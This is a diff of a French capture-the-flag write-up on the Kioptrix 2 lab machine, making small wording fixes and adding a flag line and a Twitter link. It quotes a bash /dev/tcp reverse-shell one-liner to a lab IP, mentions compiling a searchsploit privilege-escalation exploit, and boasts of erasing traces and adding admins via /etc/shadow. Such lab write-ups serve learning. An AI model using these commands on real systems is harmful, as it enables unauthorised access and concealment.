@@ -62,7 +62,7 @@ Succès,on a réussi à lire le fichier /etc/passwd.donc on va essayer d'anvoyer
 <p align="center">
   <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/nc_reverse_shell_10.png" width="860" height="170">
 </p>
-je met en mode écoute pour un reverse shell,et rien n'est passé.Donc la commande netcat peut etre n'est pas installé,donc il faut essayer avec une méthode.**bash -i >& /dev/tcp/10.0.4.4/1234 0>&1** est une commande qui permet de nous envoyer un reverse shell.
+je met mon interface en mode écoute pour un reverse shell,et rien n'est passé.Donc la commande netcat peut etre n'est pas installé,donc il faut essayer avec une autre méthode.**bash -i >& /dev/tcp/10.0.4.4/1234 0>&1** est une commande qui permet de nous envoyer un reverse shell.
 <p align="center">
   <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/get_reverse_shell_11.png" width="860" height="220">
 </p>
@@ -80,7 +80,7 @@ Ensuite, j'ai examiné la base de données searchsploit installée sur le systè
 <p align="center">
   <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/metasploit.png" width="860" height="320">
 </p>
-alors on a trouvé un script en C qui exploite cette vulnérabilité de centos.alors je copier le script dans mon répertoire de travail pour l'éxécuter sur la machine cible.
+alors on a trouvé un script en C qui exploite cette vulnérabilité de centos.alors je copie le script dans mon répertoire de travail pour l'éxécuter sur la machine cible.
 <p align="center">
   <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/copier.png" width="860" height="170">
 </p>
@@ -88,15 +88,16 @@ je lance mon serveur sur mon espace de travail pour transmettre le fichier vers 
 <p align="center">
   <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/upload_exploit_14.png" width="860" height="220">
 </p>
-mon exploit est bien recu,donc je le compile avec gcc,apres je l'éxécute.
+mon exploit est bien recu,donc je le compile avec gcc,aprés je l'éxécute.
 <p align="center">
   <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/get_root_15.png" width="860" height="170">
 </p>
-une fois on a gagner l'accés administrateur,je peux supprimer mes traces, modifier dans le fichier **/etc/shadow** en ajoutant de nouveaux administrateurs,supprimer des comptes et aussi stopper l'éxécution des services....Donc, j'ai le pouvoir absolu de faire ce que je veux.
+une immense satisfaction,j'ai réussi à gagné l'accés administrateur.donc je peux aler récupérer le **FLAG**
+une fois on a gagné l'accés administrateur,je peux supprimer mes traces, modifier dans le fichier **/etc/shadow** en ajoutant de nouveaux administrateurs,supprimer des comptes et aussi stopper l'éxécution des services....Donc, j'ai le pouvoir absolu de faire ce que je veux.
 <p align="center">
   <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/boom.gif" width="460" height="220">
 </p>
-
+support me on [twitter](https://twitter.com/rajoul6)
 
 
 
